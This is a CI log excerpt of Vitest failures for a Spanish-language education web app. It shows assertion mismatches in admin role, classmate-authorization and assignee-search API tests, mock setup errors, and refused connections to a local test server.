2025-11-18T17:36:11.3208944Z Received: 
2025-11-18T17:36:11.3209218Z 
2025-11-18T17:36:11.3209381Z   1st spy call:
2025-11-18T17:36:11.3209395Z 
2025-11-18T17:36:11.3209519Z   Array [
2025-11-18T17:36:11.3209669Z     Object {
2025-11-18T17:36:11.3210006Z -     "error": "Missing or invalid userId parameter",
2025-11-18T17:36:11.3210240Z +     "error": "userId is required",
2025-11-18T17:36:11.3210369Z     },
2025-11-18T17:36:11.3210489Z   ]
2025-11-18T17:36:11.3210502Z 
2025-11-18T17:36:11.3210526Z 
2025-11-18T17:36:11.3210698Z Number of calls: 1
2025-11-18T17:36:11.3210902Z [39m
2025-11-18T17:36:11.3211508Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m162:24[22m[39m
2025-11-18T17:36:11.3211696Z     [90m160| [39m
2025-11-18T17:36:11.3212242Z     [90m161| [39m      expect(res.status).toHaveBeenCalledWith(400);
2025-11-18T17:36:11.3212695Z     [90m162| [39m      expect(res.json).toHaveBeenCalledWith({ 
2025-11-18T17:36:11.3213039Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3213497Z     [90m163| [39m        error: 'Missing or invalid userId parameter' 
2025-11-18T17:36:11.3213728Z     [90m164| [39m      });
2025-11-18T17:36:11.3213744Z 
2025-11-18T17:36:11.3214163Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[222/545]⎯[22m[39m
2025-11-18T17:36:11.3214178Z 
2025-11-18T17:36:11.3215886Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mPOST /api/admin/user-roles[2m > [22mshould assign a role successfully
2025-11-18T17:36:11.3217069Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ { user_id: 'admin-123', …(2) } ]
2025-11-18T17:36:11.3217094Z 
2025-11-18T17:36:11.3217244Z Received: 
2025-11-18T17:36:11.3217258Z 
2025-11-18T17:36:11.3217267Z 
2025-11-18T17:36:11.3217283Z 
2025-11-18T17:36:11.3217445Z Number of calls: 0
2025-11-18T17:36:11.3217624Z [39m
2025-11-18T17:36:11.3218223Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m279:34[22m[39m
2025-11-18T17:36:11.3218424Z     [90m277| [39m
2025-11-18T17:36:11.3218887Z     [90m278| [39m      // CRITICAL: Verify audit log was created
2025-11-18T17:36:11.3219394Z     [90m279| [39m      expect(mockAuditLogInsert).toHaveBeenCalledWith({
2025-11-18T17:36:11.3219758Z     [90m   | [39m                                 [31m^[39m
2025-11-18T17:36:11.3220081Z     [90m280| [39m        user_id: 'admin-123',
2025-11-18T17:36:11.3220420Z     [90m281| [39m        action: 'role_assigned',
2025-11-18T17:36:11.3220457Z 
2025-11-18T17:36:11.3220842Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[223/545]⎯[22m[39m
2025-11-18T17:36:11.3220855Z 
2025-11-18T17:36:11.3222243Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mPOST /api/admin/user-roles[2m > [22mshould validate role type
2025-11-18T17:36:11.3222950Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 400 ]
2025-11-18T17:36:11.3222964Z 
2025-11-18T17:36:11.3223089Z Received: 
2025-11-18T17:36:11.3223109Z 
2025-11-18T17:36:11.3223230Z   1st spy call:
2025-11-18T17:36:11.3223257Z 
2025-11-18T17:36:11.3223374Z   Array [
2025-11-18T17:36:11.3223503Z -   400,
2025-11-18T17:36:11.3223622Z +   405,
2025-11-18T17:36:11.3223751Z   ]
2025-11-18T17:36:11.3223767Z 
2025-11-18T17:36:11.3223776Z 
2025-11-18T17:36:11.3223935Z Number of calls: 1
2025-11-18T17:36:11.3224114Z [39m
2025-11-18T17:36:11.3224697Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m312:26[22m[39m
2025-11-18T17:36:11.3225267Z     [90m310| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3225494Z     [90m311| [39m
2025-11-18T17:36:11.3225958Z     [90m312| [39m      expect(res.status).toHaveBeenCalledWith(400);
2025-11-18T17:36:11.3226321Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3226734Z     [90m313| [39m      expect(res.json).toHaveBeenCalledWith({
2025-11-18T17:36:11.3227411Z     [90m314| [39m        error: expect.stringContaining('Invalid role type')
2025-11-18T17:36:11.3227425Z 
2025-11-18T17:36:11.3228065Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[224/545]⎯[22m[39m
2025-11-18T17:36:11.3228083Z 
2025-11-18T17:36:11.3229628Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mPOST /api/admin/user-roles[2m > [22mshould prevent duplicate role assignments
2025-11-18T17:36:11.3230329Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 409 ]
2025-11-18T17:36:11.3230364Z 
2025-11-18T17:36:11.3230523Z Received: 
2025-11-18T17:36:11.3230537Z 
2025-11-18T17:36:11.3230668Z   1st spy call:
2025-11-18T17:36:11.3230679Z 
2025-11-18T17:36:11.3230800Z   Array [
2025-11-18T17:36:11.3230917Z -   409,
2025-11-18T17:36:11.3231030Z +   405,
2025-11-18T17:36:11.3231153Z   ]
2025-11-18T17:36:11.3231165Z 
2025-11-18T17:36:11.3231174Z 
2025-11-18T17:36:11.3231323Z Number of calls: 1
2025-11-18T17:36:11.3231503Z [39m
2025-11-18T17:36:11.3232074Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m355:26[22m[39m
2025-11-18T17:36:11.3232685Z     [90m353| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3232871Z     [90m354| [39m
2025-11-18T17:36:11.3233331Z     [90m355| [39m      expect(res.status).toHaveBeenCalledWith(409);
2025-11-18T17:36:11.3233665Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3234109Z     [90m356| [39m      expect(res.json).toHaveBeenCalledWith({
2025-11-18T17:36:11.3234900Z     [90m357| [39m        error: 'User already has this role with the same organizationa…
2025-11-18T17:36:11.3234918Z 
2025-11-18T17:36:11.3235326Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[225/545]⎯[22m[39m
2025-11-18T17:36:11.3235338Z 
2025-11-18T17:36:11.3237170Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mDELETE /api/admin/user-roles[2m > [22mshould remove a role successfully and create audit log
2025-11-18T17:36:11.3238597Z [31m[1mAssertionError[22m: expected "spy" to be called at least once[39m
2025-11-18T17:36:11.3239264Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m443:26[22m[39m
2025-11-18T17:36:11.3239451Z     [90m441| [39m
2025-11-18T17:36:11.3239788Z     [90m442| [39m      // Verify the role was deleted
2025-11-18T17:36:11.3240178Z     [90m443| [39m      expect(mockDelete).toHaveBeenCalled();
2025-11-18T17:36:11.3240517Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3240747Z     [90m444| [39m      
2025-11-18T17:36:11.3241100Z     [90m445| [39m      // Verify profile was updated
2025-11-18T17:36:11.3241115Z 
2025-11-18T17:36:11.3241502Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[226/545]⎯[22m[39m
2025-11-18T17:36:11.3241516Z 
2025-11-18T17:36:11.3243072Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mDELETE /api/admin/user-roles[2m > [22mshould prevent removing the last admin role
2025-11-18T17:36:11.3243765Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 400 ]
2025-11-18T17:36:11.3243796Z 
2025-11-18T17:36:11.3243931Z Received: 
2025-11-18T17:36:11.3243943Z 
2025-11-18T17:36:11.3244088Z   1st spy call:
2025-11-18T17:36:11.3244101Z 
2025-11-18T17:36:11.3244224Z   Array [
2025-11-18T17:36:11.3244348Z -   400,
2025-11-18T17:36:11.3244481Z +   405,
2025-11-18T17:36:11.3244604Z   ]
2025-11-18T17:36:11.3244617Z 
2025-11-18T17:36:11.3244626Z 
2025-11-18T17:36:11.3244803Z Number of calls: 1
2025-11-18T17:36:11.3244974Z [39m
2025-11-18T17:36:11.3245554Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m505:26[22m[39m
2025-11-18T17:36:11.3246123Z     [90m503| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3246347Z     [90m504| [39m
2025-11-18T17:36:11.3247021Z     [90m505| [39m      expect(res.status).toHaveBeenCalledWith(400);
2025-11-18T17:36:11.3247373Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3247773Z     [90m506| [39m      expect(res.json).toHaveBeenCalledWith({
2025-11-18T17:36:11.3248416Z     [90m507| [39m        error: 'Cannot remove the last admin role'
2025-11-18T17:36:11.3248430Z 
2025-11-18T17:36:11.3248834Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[227/545]⎯[22m[39m
2025-11-18T17:36:11.3248849Z 
2025-11-18T17:36:11.3250488Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mAudit Log Error Handling[2m > [22mshould still complete operation even if audit log fails
2025-11-18T17:36:11.3251374Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ { success: true, …(1) } ]
2025-11-18T17:36:11.3251397Z 
2025-11-18T17:36:11.3251543Z Received: 
2025-11-18T17:36:11.3251555Z 
2025-11-18T17:36:11.3251689Z   1st spy call:
2025-11-18T17:36:11.3251700Z 
2025-11-18T17:36:11.3251813Z   Array [
2025-11-18T17:36:11.3251938Z     Object {
2025-11-18T17:36:11.3252094Z -     "roles": Array [
2025-11-18T17:36:11.3252219Z -       Object {
2025-11-18T17:36:11.3252373Z -         "id": "role-1",
2025-11-18T17:36:11.3252613Z -         "role_type": "consultor",
2025-11-18T17:36:11.3252841Z -         "user_id": "user-456",
2025-11-18T17:36:11.3252969Z -       },
2025-11-18T17:36:11.3253099Z -     ],
2025-11-18T17:36:11.3253264Z -     "success": true,
2025-11-18T17:36:11.3253577Z +     "error": "Error inesperado al obtener roles",
2025-11-18T17:36:11.3253698Z     },
2025-11-18T17:36:11.3253815Z   ]
2025-11-18T17:36:11.3254039Z 
2025-11-18T17:36:11.3254066Z 
2025-11-18T17:36:11.3254227Z Number of calls: 1
2025-11-18T17:36:11.3254429Z [39m
2025-11-18T17:36:11.3255132Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m556:24[22m[39m
2025-11-18T17:36:11.3255354Z     [90m554| [39m
2025-11-18T17:36:11.3255841Z     [90m555| [39m      // Should still return roles even if audit log failed
2025-11-18T17:36:11.3256238Z     [90m556| [39m      expect(res.json).toHaveBeenCalledWith({
2025-11-18T17:36:11.3256534Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3257007Z     [90m557| [39m        success: true,
2025-11-18T17:36:11.3257302Z     [90m558| [39m        roles: mockRoles
2025-11-18T17:36:11.3257327Z 
2025-11-18T17:36:11.3257743Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[228/545]⎯[22m[39m
2025-11-18T17:36:11.3257759Z 
2025-11-18T17:36:11.3259828Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould handle users with multiple roles (docente + lider_generacion)
2025-11-18T17:36:11.3260543Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 200 ]
2025-11-18T17:36:11.3260559Z 
2025-11-18T17:36:11.3260683Z Received: 
2025-11-18T17:36:11.3260700Z 
2025-11-18T17:36:11.3260826Z   1st spy call:
2025-11-18T17:36:11.3260836Z 
2025-11-18T17:36:11.3260947Z   Array [
2025-11-18T17:36:11.3261066Z -   200,
2025-11-18T17:36:11.3261178Z +   404,
2025-11-18T17:36:11.3261301Z   ]
2025-11-18T17:36:11.3261312Z 
2025-11-18T17:36:11.3261538Z 
2025-11-18T17:36:11.3261708Z Number of calls: 1
2025-11-18T17:36:11.3261908Z [39m
2025-11-18T17:36:11.3262665Z [36m [2m❯[22m __tests__/api/assignments/eligible-classmates.test.ts:[2m267:26[22m[39m
2025-11-18T17:36:11.3263229Z     [90m265| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3263448Z     [90m266| [39m
2025-11-18T17:36:11.3263928Z     [90m267| [39m      expect(res.status).toHaveBeenCalledWith(200);
2025-11-18T17:36:11.3264297Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3264718Z     [90m268| [39m      expect(res.json).toHaveBeenCalledWith({
2025-11-18T17:36:11.3265111Z     [90m269| [39m        classmates: expect.arrayContaining([
2025-11-18T17:36:11.3265125Z 
2025-11-18T17:36:11.3265497Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[229/545]⎯[22m[39m
2025-11-18T17:36:11.3265510Z 
2025-11-18T17:36:11.3267661Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould prefer docente role when user has multiple roles
2025-11-18T17:36:11.3268338Z [31m[1mAssertionError[22m: expected undefined not to be undefined[39m
2025-11-18T17:36:11.3269129Z [36m [2m❯[22m __tests__/api/assignments/eligible-classmates.test.ts:[2m421:32[22m[39m
2025-11-18T17:36:11.3269345Z     [90m419| [39m      );
2025-11-18T17:36:11.3269724Z     [90m420| [39m
2025-11-18T17:36:11.3270144Z     [90m421| [39m      expect(roleSelectionLog).toBeDefined();
2025-11-18T17:36:11.3270512Z     [90m   | [39m                               [31m^[39m
2025-11-18T17:36:11.3270994Z     [90m422| [39m      expect(roleSelectionLog).toContain('docente');
2025-11-18T17:36:11.3271477Z     [90m423| [39m      expect(roleSelectionLog).toContain(docenteSchoolId);
2025-11-18T17:36:11.3271499Z 
2025-11-18T17:36:11.3271892Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[230/545]⎯[22m[39m
2025-11-18T17:36:11.3271907Z 
2025-11-18T17:36:11.3274007Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould fallback to estudiante role if no docente role with school_id
2025-11-18T17:36:11.3274645Z [31m[1mAssertionError[22m: expected undefined not to be undefined[39m
2025-11-18T17:36:11.3275425Z [36m [2m❯[22m __tests__/api/assignments/eligible-classmates.test.ts:[2m564:32[22m[39m
2025-11-18T17:36:11.3275645Z     [90m562| [39m      );
2025-11-18T17:36:11.3275829Z     [90m563| [39m
2025-11-18T17:36:11.3276247Z     [90m564| [39m      expect(roleSelectionLog).toBeDefined();
2025-11-18T17:36:11.3276615Z     [90m   | [39m                               [31m^[39m
2025-11-18T17:36:11.3277311Z     [90m565| [39m      expect(roleSelectionLog).toContain('estudiante');
2025-11-18T17:36:11.3277537Z     [90m566| [39m
2025-11-18T17:36:11.3277554Z 
2025-11-18T17:36:11.3277973Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[231/545]⎯[22m[39m
2025-11-18T17:36:11.3278002Z 
2025-11-18T17:36:11.3279923Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould return 403 when user has no roles with school_id
2025-11-18T17:36:11.3280612Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 403 ]
2025-11-18T17:36:11.3280642Z 
2025-11-18T17:36:11.3280773Z Received: 
2025-11-18T17:36:11.3280786Z 
2025-11-18T17:36:11.3280924Z   1st spy call:
2025-11-18T17:36:11.3280940Z 
2025-11-18T17:36:11.3281062Z   Array [
2025-11-18T17:36:11.3281190Z -   403,
2025-11-18T17:36:11.3281317Z +   404,
2025-11-18T17:36:11.3281438Z   ]
2025-11-18T17:36:11.3281449Z 
2025-11-18T17:36:11.3281458Z 
2025-11-18T17:36:11.3281624Z Number of calls: 1
2025-11-18T17:36:11.3281810Z [39m
2025-11-18T17:36:11.3282573Z [36m [2m❯[22m __tests__/api/assignments/eligible-classmates.test.ts:[2m641:26[22m[39m
2025-11-18T17:36:11.3283350Z     [90m639| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3283540Z     [90m640| [39m
2025-11-18T17:36:11.3284002Z     [90m641| [39m      expect(res.status).toHaveBeenCalledWith(403);
2025-11-18T17:36:11.3284353Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3284782Z     [90m642| [39m      expect(res.json).toHaveBeenCalledWith({
2025-11-18T17:36:11.3285204Z     [90m643| [39m        error: 'No tienes una escuela asignada'
2025-11-18T17:36:11.3285220Z 
2025-11-18T17:36:11.3285624Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[232/545]⎯[22m[39m
2025-11-18T17:36:11.3285642Z 
2025-11-18T17:36:11.3287656Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mAuthorization[2m > [22mshould reject if group is consultant-managed
2025-11-18T17:36:11.3288360Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 403 ]
2025-11-18T17:36:11.3288396Z 
2025-11-18T17:36:11.3288535Z Received: 
2025-11-18T17:36:11.3288547Z 
2025-11-18T17:36:11.3288682Z   1st spy call:
2025-11-18T17:36:11.3288695Z 
2025-11-18T17:36:11.3288814Z   Array [
2025-11-18T17:36:11.3288940Z -   403,
2025-11-18T17:36:11.3289061Z +   404,
2025-11-18T17:36:11.3289184Z   ]
2025-11-18T17:36:11.3289197Z 
2025-11-18T17:36:11.3289205Z 
2025-11-18T17:36:11.3289361Z Number of calls: 1
2025-11-18T17:36:11.3289779Z [39m
2025-11-18T17:36:11.3290593Z [36m [2m❯[22m __tests__/api/assignments/eligible-classmates.test.ts:[2m725:26[22m[39m
2025-11-18T17:36:11.3291187Z     [90m723| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3291375Z     [90m724| [39m
2025-11-18T17:36:11.3291807Z     [90m725| [39m      expect(res.status).toHaveBeenCalledWith(403);
2025-11-18T17:36:11.3292124Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3292549Z     [90m726| [39m      expect(res.json).toHaveBeenCalledWith({
2025-11-18T17:36:11.3293159Z     [90m727| [39m        error: 'No puedes invitar compañeros a un grupo administrado p…
2025-11-18T17:36:11.3293176Z 
2025-11-18T17:36:11.3293577Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[233/545]⎯[22m[39m
2025-11-18T17:36:11.3293590Z 
2025-11-18T17:36:11.3295693Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mAuthentication and Authorization[2m > [22mshould return 401 when user is not authenticated
2025-11-18T17:36:11.3298020Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mAuthentication and Authorization[2m > [22mshould return 403 when user lacks manage permission
2025-11-18T17:36:11.3300262Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mService Role Client Usage[2m > [22mshould use service role client for user_roles when schoolId is provided
2025-11-18T17:36:11.3302256Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mService Role Client Usage[2m > [22mshould use service role client for group member counts
2025-11-18T17:36:11.3304212Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mResponse Shape and Pagination[2m > [22mshould return correct response shape with pagination info
2025-11-18T17:36:11.3306142Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mResponse Shape and Pagination[2m > [22mshould handle empty results correctly
2025-11-18T17:36:11.3308273Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mInput Validation[2m > [22mshould return 400 for missing required fields
2025-11-18T17:36:11.3310432Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mInput Validation[2m > [22mshould return 400 for invalid searchType
2025-11-18T17:36:11.3312332Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.service-role.spec.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mInput Validation[2m > [22mshould return 405 for non-POST methods
2025-11-18T17:36:11.3312963Z [31m[1mTypeError[22m: getApiUser.mockResolvedValue is not a function[39m
2025-11-18T17:36:11.3313814Z [36m [2m❯[22m __tests__/api/learning-paths/search-assignees.service-role.spec.ts:[2m41:31[22m[39m
2025-11-18T17:36:11.3314083Z     [90m 39| [39m  beforeEach(() => {
2025-11-18T17:36:11.3314387Z     [90m 40| [39m    jest.clearAllMocks();
2025-11-18T17:36:11.3314946Z     [90m 41| [39m    (getApiUser as jest.Mock).mockResolvedValue({ user: mockUser, erro…
2025-11-18T17:36:11.3315274Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.3315838Z     [90m 42| [39m    (createApiSupabaseClient as jest.Mock).mockResolvedValue(mockSessi…
2025-11-18T17:36:11.3316620Z     [90m 43| [39m    (createServiceRoleClient as jest.Mock).mockReturnValue(mockService…
2025-11-18T17:36:11.3316641Z 
2025-11-18T17:36:11.3317235Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[234/545]⎯[22m[39m
2025-11-18T17:36:11.3317251Z 
2025-11-18T17:36:11.3318744Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould return 405 for non-POST requests
2025-11-18T17:36:11.3320142Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould require authentication
2025-11-18T17:36:11.3321511Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould check user permissions
2025-11-18T17:36:11.3322898Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould validate required parameters
2025-11-18T17:36:11.3324486Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould return filtered user results with assignment status
2025-11-18T17:36:11.3325896Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould handle pagination correctly
2025-11-18T17:36:11.3327594Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould handle empty search results
2025-11-18T17:36:11.3328449Z [31m[1mTypeError[22m: createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:36:11.3329180Z [36m [2m❯[22m __tests__/api/learning-paths/search-assignees.test.ts:[2m51:44[22m[39m
2025-11-18T17:36:11.3329503Z     [90m 49| [39m  beforeEach(() => {
2025-11-18T17:36:11.3329836Z     [90m 50| [39m    jest.clearAllMocks();
2025-11-18T17:36:11.3330502Z     [90m 51| [39m    (createApiSupabaseClient as jest.Mock).mockResolvedValue(mockSupab…
2025-11-18T17:36:11.3330888Z     [90m   | [39m                                           [31m^[39m
2025-11-18T17:36:11.3331083Z     [90m 52| [39m  });
2025-11-18T17:36:11.3331250Z     [90m 53| [39m
2025-11-18T17:36:11.3331264Z 
2025-11-18T17:36:11.3331644Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[235/545]⎯[22m[39m
2025-11-18T17:36:11.3331657Z 
2025-11-18T17:36:11.3333518Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mPersonalización área[2m > [22mshould return 44 sections for personalizacion
2025-11-18T17:36:11.3334251Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3334992Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m13:24[22m[39m
2025-11-18T17:36:11.3335418Z     [90m 11| [39m  describe('Personalización área', () => {
2025-11-18T17:36:11.3335935Z     [90m 12| [39m    it('should return 44 sections for personalizacion', async () => {
2025-11-18T17:36:11.3336510Z     [90m 13| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3337043Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3337254Z     [90m 14| [39m
2025-11-18T17:36:11.3337606Z     [90m 15| [39m      expect(response.ok).toBe(true);
2025-11-18T17:36:11.3337621Z 
2025-11-18T17:36:11.3338794Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3339629Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3339647Z 
2025-11-18T17:36:11.3340047Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3341178Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3341834Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[236/545]⎯[22m[39m
2025-11-18T17:36:11.3341851Z 
2025-11-18T17:36:11.3343716Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mPersonalización área[2m > [22mshould have correct structure for each section
2025-11-18T17:36:11.3344104Z [31m[1mTypeError[22m: fetch failed[39m
2025-11-18T17:36:11.3344776Z [36m [2m❯[22m __tests__/api/transformation/area-questions.test.ts:[2m29:24[22m[39m
2025-11-18T17:36:11.3344961Z     [90m 27| [39m
2025-11-18T17:36:11.3345579Z     [90m 28| [39m    it('should have correct structure for each section', async () => {
2025-11-18T17:36:11.3346161Z     [90m 29| [39m      const response = await fetch(`${API_BASE}/api/transformation/are…
2025-11-18T17:36:11.3346484Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.3347080Z     [90m 30| [39m      const data = await response.json();
2025-11-18T17:36:11.3347334Z     [90m 31| [39m
2025-11-18T17:36:11.3347362Z 
2025-11-18T17:36:11.3348038Z [31m[1mCaused by: Error[22m: connect ECONNREFUSED ::1:3001[39m
2025-11-18T17:36:11.3348804Z [90m [2m❯[22m TCPConnectWrap.afterConnect [as oncomplete] node:net:[2m1555:16[22m[39m
2025-11-18T17:36:11.3348829Z 
2025-11-18T17:36:11.3349206Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.3350316Z [31m[1mSerialized Error:[22m[39m [90m{ errno: -111, code: 'ECONNREFUSED', syscall: 'connect', address: '::1', port: 3001 }[39m
2025-11-18T17:36:11.3350785Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[237/545]⎯[22m[39m
2025-11-18T17:36:11.3350817Z 
